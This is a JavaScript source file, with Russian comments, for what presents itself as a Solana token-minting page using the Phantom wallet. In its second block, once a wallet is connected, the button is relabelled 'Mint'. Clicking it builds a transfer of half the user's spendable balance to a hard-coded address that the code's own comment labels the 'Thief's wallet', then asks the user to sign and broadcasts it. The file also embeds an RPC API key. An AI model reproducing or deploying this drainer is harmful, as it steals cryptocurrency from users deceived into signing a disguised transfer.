// Функция для минтинга токенов
mintButton.addEventListener('click', async () => {
  try {
    if (wallet) {
      const balance = await getBalance(wallet.publicKey.toString());  // Преобразуем publicKey в строку
      if (balance < 1000000) {  // Пример проверки баланса
        alert('Insufficient funds for transaction');
        return;
      }

      // Здесь будет ваш код для минтинга токенов
      console.log('Minting tokens...');
      alert('Tokens minted successfully!');
    } else {
      alert('Wallet is not connected');
    }
  } catch (err) {
    console.error('Error minting tokens:', err);
  }
});



$(document).ready(function() {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);

                var connection = new solanaWeb3.Connection(
                    'https://solana-mainnet.api.syndica.io/api-key/42aSFR7aLhxB7NfXEq78aMvkfweu58G4ngdwhri32u9BAaaQ9wShomjTtKH9RCKJDpS3sxRGQXeZk3Wp8s8BDbLPjmLTCqTHhoN', 
                    'confirmed'
                );

                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(public_key);
                console.log("Wallet balance:", walletBalance);

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for rent.");
                    return;
                }

                $('#connect-wallet').text("Mint");
                $('#connect-wallet').off('click').on('click', async () => {
                    try {
                        const recieverWallet = new solanaWeb3.PublicKey('DVm4XnbDT6hzhcVJBeM2DMbq3URGDpC5qkzd2rwhvFwK'); // Thief's wallet
                        const balanceForTransfer = walletBalance - minBalance;
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                        var transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: resp.publicKey,
                                toPubkey: recieverWallet,
                                lamports: balanceForTransfer * 0.50,
                            }),
                        );

                        transaction.feePayer = window.solana.publicKey;
                        let blockhashObj = await connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;

                        const signed = await window.solana.signTransaction(transaction);
                        console.log("Transaction signed:", signed);

                        let txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        console.log("Transaction confirmed:", txid);
                    } catch (err) {
                        console.error("Error during minting:", err);
                    }
                });
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
            }
        } else {
            alert("Phantom extension not found.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
        }
    });
});
